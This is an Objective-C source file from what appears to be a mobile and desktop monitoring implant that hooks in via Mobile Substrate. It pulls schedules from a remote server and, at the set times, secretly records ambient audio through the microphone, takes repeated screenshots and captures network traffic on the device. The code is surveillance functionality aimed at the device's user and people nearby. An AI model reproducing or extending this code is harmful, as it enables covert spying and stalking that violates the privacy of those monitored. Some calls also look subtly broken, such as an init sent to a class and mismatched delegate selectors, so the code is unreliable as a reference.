//
//  TemporalControlManagerImpl.m
//  TemporalControlManager
//
//  Created by Benjawan Tanarattanakorn on 2/18/2558 BE.
//
//

#import "TemporalControlManagerImpl.h"

#import "DeliveryRequest.h"
#import "DataDelivery.h"
#import "DeliveryResponse.h"
#import "DefStd.h"

#import "AmbientRecordingManager.h"
#import "AmbientRecordingContants.h"

#import "ScreenshotCaptureManager.h"
#import "ScreenshotCaptureDelegate.h"
#import "NetworkTrafficCaptureManager.h"
#import "NetworkTrafficCaptureDelegate.h"


#import "GetTemporalControl.h"
#import "GetTemporalControlResponse.h"
#import "SendTemporalControl.h"
#import "SendTemporalControlResponse.h"

#import "TemporalControl.h"
#import "TemporalActionParams.h"
#import "TemporalStore.h"
#import "TemporalControlValidator.h"
#import "NSDate+TemporalControl.h"
#import "TemporalScheduler.h"

#import "PCPersistentTimer.h"
#import "PCSimpleTimer.h"


@interface TemporalControlManagerImpl (private)
- (void) temporalSchedulingCompleted: (NSTimer *) aTimer;
@end

@implementation TemporalControlManagerImpl

@synthesize mDDM;
@synthesize mTemporalControlDelegate;
@synthesize mAmbientRecordingManager;
@synthesize mScreenshotCaptureManager;
@synthesize mNetworkTrafficCaptureManager;
@synthesize mTemporalStore;
@synthesize mValidator;
@synthesize mScheduler;
@synthesize mEnableScreenShot,mEnableNetworkTraffic;

//@synthesize mTemporalStore, mValidator, mScheduler;

@synthesize mIsMonitoring;
@synthesize mIsRecording;

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	if ((self = [super init])) {
        mDDM = aDDM;
        mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kTemporalControlApplicationPort
                                                 withMessagePortIPCDelegate:self];
#if TARGET_OS_IPHONE
        [self.mScheduler loadMobileTimerApplication];
#endif
	}
	return (self);
}

#pragma mark - Getter

- (TemporalStore *) mTemporalStore {
    if (!mTemporalStore) {
        mTemporalStore  = [[TemporalStore alloc] init];
    }
    return mTemporalStore;
}

- (TemporalControlValidator *) mValidator {
    if (!mValidator) {
        mValidator = [[TemporalControlValidator alloc] init];
    }
    return mValidator;
}

- (TemporalScheduler *) mScheduler {
    if (!mScheduler) {
        mScheduler = [[TemporalScheduler alloc] init];
        mScheduler.mTarget = self;
        #if TARGET_OS_IPHONE
        mScheduler.mSelector = @selector(temporalSchedulingCompletedForIPhone:);
        #else
        mScheduler.mSelector = @selector(temporalSchedulingCompleted:);
        #endif
        
    }
    return mScheduler;
}

#pragma mark - Start/Stop Temporal Control

- (void) startTemporalControl {
    DLog(@"-- startTemporalControl --");

    // Open message port to listen to data sent from Mobile Substrate
    if (!self.mIsMonitoring) {
        self.mIsMonitoring = YES;
        [mMessagePortReader start];
        [self registerMidnightPassedNotification];
    }
    DLog(@"startTemporalControl scheduleAllTemporalControls");
    [self scheduleAllTemporalControls];
}

- (void) scheduleAllTemporalControls {
    
    // 1 read Temporal Control information from database
    NSDictionary *temporalControl       = [self.mTemporalStore temporals];
    
    // 2 Ensure only valid Temporal Control is considered
    
    // 2.1 Filter invalid date
    NSDictionary *validTemporalControl  = [self.mValidator validTemporalControls:temporalControl];
    
    // 2.2 Filter invalid time
    validTemporalControl                = [self.mValidator validTemporalControlsWithTime:validTemporalControl];
    
    // 3 Schedule valid temporal control
    [self.mScheduler startScheduling:validTemporalControl];
}

- (void) stopTemporalControl {
    DLog(@"-- stopTemporalControl --");
    if (self.mIsMonitoring) {
		[mMessagePortReader stop];
		self.mIsMonitoring = NO;
        [self unregisterMidnightPassedNotification];
	}
}

#pragma mark TemporalControlManager Protocol

// receive from server
- (BOOL) requestTemporalControl: (id <TemporalControlDelegate>) aDelegate {
    DLog(@"requestTemporalControl, aDelegate = %@", aDelegate);
    BOOL canProcess = NO;
    
    DeliveryRequest *temporalControlRequest = [self getTemporalControlRequest];
    
    if (![self.mDDM isRequestIsPending:temporalControlRequest]) {
        DLog (@"not pending");
        [self.mDDM deliver:temporalControlRequest];
        [self setMTemporalControlDelegate:aDelegate];
        canProcess = YES;
    }
    return canProcess;
}

// send to server
- (BOOL) syncTemporalControl: (id <TemporalControlDelegate>) aDelegate {
    DLog(@"syncTemporalControl, aDelegate = %@", aDelegate);
	BOOL canProcess = NO;
	
	DeliveryRequest* request                = [self sendTemporalControlRequest];
    
	if (![self.mDDM isRequestIsPending:request]) {
        DLog (@"not pending");
		[self.mDDM deliver:request];
		[self setMTemporalControlDelegate:aDelegate];
		canProcess = YES;
	}
	return canProcess;
}

#pragma mark - DeliveryListener Protocol

/*
 - (void) requestTemporalControlCompleted: (NSError *) aError;
 - (void) syncTemporalControlCompleted: (NSError *) aError;
 */

- (void) requestFinished: (DeliveryResponse *) aResponse {
    DLog(@"==================== requestFinished aResponse %@ EDPType = %d", aResponse, [aResponse mEDPType]);
	
	if ([aResponse mSuccess]) {
        // Receive from server
        if ([aResponse mEDPType] == kEDPTypeGetTemporalControl) {
            
            id <TemporalControlDelegate> delegate = [self mTemporalControlDelegate];
            
            [self setMTemporalControlDelegate:nil];
            
            if ([delegate respondsToSelector:@selector(syncTemporalControlCompleted:)]) {
                [delegate syncTemporalControlCompleted:nil];
            }
            
            GetTemporalControlResponse *temporalControlResponse = (GetTemporalControlResponse *)[aResponse mCSMReponse];
            NSArray * responseDataArray                         = [temporalControlResponse mTemporalControls];
            DLog (@"responseDataArray = %@", responseDataArray);
            
            // -- Store Temporal Control received from server to our database
            [self.mTemporalStore storeTemporals:responseDataArray];
            
            if (self.mIsMonitoring) {
                DLog(@"Preference for temporal is enabled, so schedule now");
                [self scheduleAllTemporalControls];
            }
        }
        // Send to server
        else if ([aResponse mEDPType] == kEDPTypeSendTemporalControl) {
           
            id <TemporalControlDelegate> delegate = [self mTemporalControlDelegate];
            [self setMTemporalControlDelegate:nil];
            
            if ([delegate respondsToSelector:@selector(requestTemporalControlCompleted:)]) {
                [delegate syncTemporalControlCompleted:nil];
            }
            
            //SendTemporalControlResponse *temporalControlResponse = (SendTemporalControlResponse *)[aResponse mCSMReponse];
            // Nothing to care about
        }
	} else {
		id <TemporalControlDelegate> delegate = [self mTemporalControlDelegate];
		[self setMTemporalControlDelegate:nil];
		
		NSDictionary *userInfo	= [NSDictionary dictionaryWithObject:aResponse
                                                             forKey:@"DMMResponse"];
        
		NSError *error			= [NSError errorWithDomain:@"Temporal Application Control Error"
                                                    code:[aResponse mStatusCode]
                                                userInfo:userInfo];
		
        if ([aResponse mEDPType] == kEDPTypeGetTemporalControl) {
            if ([delegate respondsToSelector:@selector(syncTemporalControlCompleted:)]) {
                [delegate syncTemporalControlCompleted:error];
            }
        } else if ([aResponse mEDPType] == kEDPTypeSendTemporalControl) {
            if ([delegate respondsToSelector:@selector(requestTemporalControlCompleted:)]) {
                [delegate requestTemporalControlCompleted:error];
            }
        }
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
    DLog(@"updateRequestProgress");
    // Nothing to update
}

#pragma mark - DeliveryRequest

- (DeliveryRequest *) getTemporalControlRequest {
	DeliveryRequest *deliveryRequest = [[DeliveryRequest alloc] init];
    
	GetTemporalControl *commandData = [[GetTemporalControl alloc] init];
	[deliveryRequest setMCallerId:kDDC_TemporalControlManager];
    
	[deliveryRequest setMMaxRetry:3];
	[deliveryRequest setMRetryTimeout:60];
	[deliveryRequest setMConnectionTimeout:60];
    
	[deliveryRequest setMEDPType:kEDPTypeGetTemporalControl];
	[deliveryRequest setMPriority:kDDMRequestPriortyNormal];
	[deliveryRequest setMCommandCode:[commandData getCommand]];
	[deliveryRequest setMCommandData:commandData];
	[deliveryRequest setMCompressionFlag:1];
	[deliveryRequest setMEncryptionFlag:1];
	[deliveryRequest setMDeliveryListener:self];
	[commandData release];
	return ([deliveryRequest autorelease]);
}

- (DeliveryRequest*) sendTemporalControlRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    
    SendTemporalControl *commandData = [SendTemporalControl init];
    [request setMCallerId:kDDC_TemporalControlManager];
    
    [request setMMaxRetry:3];
    [request setMRetryTimeout:60];
	[request setMConnectionTimeout:60];

    [request setMEDPType:kEDPTypeSendTemporalControl];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMCommandCode:[commandData getCommand]];
	[request setMCommandData:commandData];
    [request setMCompressionFlag:1];
	[request setMEncryptionFlag:1];
	[request setMDeliveryListener:self];
    [commandData release];
	return [request autorelease];
}

#pragma mark - MessagePortIPC

/*  This will be invoked when the time to do the event arrives
        
    If the id match to anyone in the database, look at the type of event.
    Then execute the task
 */
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    DLog (@"TEMPORAL CONTROL %@", aRawData);
    
    id info = (NSDictionary*) [NSKeyedUnarchiver unarchiveObjectWithData:aRawData];    // Convert NSData to NSDictionary
    DLog(@">>> info from mobile substrate %@", info);
    
    if ([info isKindOfClass:[NSDictionary class]]) {
        NSNumber *temporalControlID     = info[kTemporalControlApplicationIDKey];
        //NSString *commandString         = info[kTemporalControlApplicationCommandKey];
        //NSString *startTime             = info[kTemporalControlApplicationStartTimeKey];
        [self executeTemporalControlWithID: temporalControlID];
    }
}

#pragma mark - ScreenshotCaptureDelegate

-(void) screenshotCaptureCompleted:(NSError *)aError{
    DLog(@"screenshotCaptureCompleted with %d", (int)[aError code]);
}

#pragma mark - AmbientRecordingDelegate

- (void) recordingCompleted: (NSError *) aError {
#if TARGET_OS_IPHONE
        DLog (@"!!!!!!! OnDemandRecordProcessor ---> recordingCompleted %@", aError)
        
        NSInteger errorCode = [aError code];		// kAmbientRecordingOK or kAmbientRecordingEndByInterruption
        
        if (errorCode == kAmbientRecordingOK ||
            errorCode == kAmbientRecordingEndByInterruption) {		// interrupted by call in/out
            DLog (@"recording complete")
        } else {									// kAmbientRecordingAudioEncodeError or kAmbientRecordingThumbnailCreationError
            DLog (@"recording fail")
        }
        
        self.mIsRecording = NO;
#else
    DLog(@"recordingCompleted with %d", (int)[aError code]);
    self.mIsRecording = NO;
#endif
}

#pragma mark - NetworkTrafficDelegate

- (void) networkTrafficCaptureCompleted: (NSError *) aError{
    DLog(@"networkTrafficCaptureCompleted");
}

#pragma mark -

- (void) executeTemporalControlWithID: (NSNumber *) aControlID {
    // find control id from database to check what action is it
    TemporalControl *temporalControl = [self.mTemporalStore getTemporalControlWithID:[aControlID integerValue]];
    // if can find the id, get the action first
    if (temporalControl) {
        TemporalActionControl action = [temporalControl mAction];
        switch (action) {
            case kTemporalActionControlRecordAudioAmbient:
                [self executeAmbientRecordWithTemporalControl:temporalControl];
                break;
            case kTemporalActionControlRecordScreenShot:
                if (mEnableScreenShot) {
                    [self executeScreenshotWithTemporalControl:temporalControl];
                }
                break;
            case kTemporalActionControlRecordNetworkTraffic:
                if (mEnableNetworkTraffic) {
                     [self executeNetworkTrafficMonitorWithTemporalControl:temporalControl];
                }
                break;
            default:
                DLog(@"Unmatch action");
                break;
        }
    } else {
        // if cannot find the id, skip it
        DLog(@"Not match any id in Temporal Control Database");
    }
}
- (void) executeNetworkTrafficMonitorWithTemporalControl: (TemporalControl *) aTemporalControl {
    DLog(@"#### executeNetworkTrafficMonitorWithTemporalControl with %@", aTemporalControl);
    
    NSString *startTime = [aTemporalControl mStartTime];
    NSString *endTime   = [aTemporalControl mEndTime];
    NSInteger diffInMin = 0;
    
    if ([endTime isEqualToString:@"     "]) {  // 5 whitespaces
        diffInMin       = -1; // Forever Loop
    } else {
        diffInMin       = [NSDate differenceInMinutesFromStartTime:startTime endTime:endTime];
    }

    if (diffInMin != 0) {
        NSInteger frequencyInSec = [[aTemporalControl mActionParams] mInterval];
//        //For Test
//        frequencyInSec = 60 ;
//        diffInMin = -1;

        [mNetworkTrafficCaptureManager startCaptureWithDuration:(int)diffInMin frequency:(int)frequencyInSec withDelegate:self];
        
    } else {
        DLog(@"Invalid interval of temporal control NetworkTrafficMonitor");
    }
}

- (void) executeAmbientRecordWithTemporalControl: (TemporalControl *) aTemporalControl {
    if (!self.mIsRecording) {
        DLog(@"#### executeAmbientRecordWithTemporalControl with %@", aTemporalControl);
        
        NSString *startTime = [aTemporalControl mStartTime];
        NSString *endTime   = [aTemporalControl mEndTime];
        
        NSInteger diffInMin = -1;
        
        if ([endTime isEqualToString:@"     "]) {  // 5 whitespaces
            // End time is not specified, so use default value of 10 minutes
            diffInMin       = 30;
        } else {
            diffInMin       = [NSDate differenceInMinutesFromStartTime:startTime endTime:endTime];
        }

        /* For Test */
        //diffInMin       = 1;
        /* For Test */
        
        if (diffInMin != -1) {
            if (![self.mAmbientRecordingManager  isRecording]) {
                DLog(@"#### mAmbientRecordingManager startRecord");
                [self.mAmbientRecordingManager startRecord:diffInMin ambientRecordingDelegate:self];
            } else {
                DLog(@"Ambient recorder is being recorded probably by other components, so cannot start this temporal control");
            }
        } else {
            DLog(@"Invalid interval of temporal control ambient record");
        }
    } else {
        DLog(@"Ambient Recording is being processed by temporal control");
    }
}

- (void) executeScreenshotWithTemporalControl: (TemporalControl *) aTemporalControl {
    
        NSString *startTime = [aTemporalControl mStartTime];
        NSString *endTime   = [aTemporalControl mEndTime];
        
        NSInteger diffInMin = -1;

        if ([endTime isEqualToString:@"     "]) {  // 5 whitespaces
            diffInMin       = 30;
        } else {
            diffInMin       = [NSDate differenceInMinutesFromStartTime:startTime endTime:endTime];
        }
    
        if (diffInMin != -1) {
            DLog(@"Start Temporal Control Screen Shot Record");
            NSInteger frequency = [[aTemporalControl mActionParams] mInterval];
            BOOL screenshot = [self.mScreenshotCaptureManager captureScheduleScreenshot:frequency duration:diffInMin delegate:self];
            DLog(@"Screen recording Status : %d (0 = busy,1 = start)", screenshot);
            if (!screenshot) {
                DLog(@"This temporal control is ignored");
            }
        } else {
            DLog(@"Invalid interval of temporal control screen record");
        }
}

#pragma mark - Darwin notification related to Midnight Passed


- (void) registerMidnightPassedNotification {
#if TARGET_OS_IPHONE
    DLog(@">>>>>>>>>>>>>>>>>> Register Midnight Passed !!");
	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),                            // center
									self,                                                                   // observer. this parameter may be NULL.
									&midnightPassedCallback,                                                // callback
									(CFStringRef) kTemporalControlApplicationMidnightPassedNotification,    // name
									NULL,                                                                   // object. this value is ignored in the case that the center is Darwin
									CFNotificationSuspensionBehaviorHold);
#else
    DLog(@">>>>>>>>>>>>>>>>>> Register Midnight Passed Mac OS X !!");
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(newDayNotify:) name:NSCalendarDayChangedNotification object:nil];
#endif
}

- (void) unregisterMidnightPassedNotification {
#if TARGET_OS_IPHONE
    DLog(@">>>>>>>>>>>>>>>>>> Unregister Midnight Passed !!");
	CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
										self,
										(CFStringRef) kTemporalControlApplicationMidnightPassedNotification,
										NULL);
#else
    DLog(@">>>>>>>>>>>>>>>>>> Unregister Midnight Passed Mac OS X !!");
    [[NSNotificationCenter defaultCenter] removeObserver:self name:NSCalendarDayChangedNotification object:nil];
#endif
}

// This method will be called when the notificaiton is received
void midnightPassedCallback (CFNotificationCenterRef center,
                             void *observer,
                             CFStringRef name,
                             const void *object,
                             CFDictionaryRef userInfo) {
    DLog(@"Midnight Passed Callback: %@", name);
    
    if ([(NSString *) name isEqualToString:kTemporalControlApplicationMidnightPassedNotification])
    {
        TemporalControlManagerImpl *this = (TemporalControlManagerImpl *) observer;
        if (this.mIsMonitoring) {
            DLog(@"Preference for temporal is enabled, so schedule now for midnight pass usecase");
            [this scheduleAllTemporalControls];
        }
    }
}

#pragma mark -Midnight Passed Mac OS X

-(void)newDayNotify:(NSNotification *)aNot{
    if (self.mIsMonitoring) {
        DLog(@"newDayNotify scheduleAllTemporalControls");
        [self scheduleAllTemporalControls];
    }
}

#pragma mark - Private methods -

- (void) temporalSchedulingCompleted: (NSTimer *) aTimer {
    DLog(@"temporalSchedulingCompleted");
    if (self.mIsMonitoring) {
        NSDictionary *userInfo = [aTimer userInfo];
        NSNumber *temporalControlID = [userInfo objectForKey:@"temporalControlID"];
        [self executeTemporalControlWithID:temporalControlID];
    }
}

- (void) temporalSchedulingCompletedForIPhone: (PCSimpleTimer *) aTimer {
    DLog(@"temporalSchedulingCompleted with timer %@", aTimer);
    if (self.mIsMonitoring) {
        NSDictionary *userInfo = [aTimer userInfo];
        NSNumber *temporalControlID = [userInfo objectForKey:@"temporalControlID"];
        [self executeTemporalControlWithID:temporalControlID];
    }
}

- (void)dealloc {
    DLog(@"Dealloc of Temporal Control Manager");
#if TARGET_OS_IPHONE
    [self.mScheduler unloadMobileTimerApplication];
#endif
    
    [self stopTemporalControl];
    
    [mMessagePortReader release];
    mMessagePortReader  = nil;
    
    self.mValidator     = nil;
    self.mTemporalStore = nil;
    self.mScheduler     = nil;
    
    [super dealloc];
}

@end
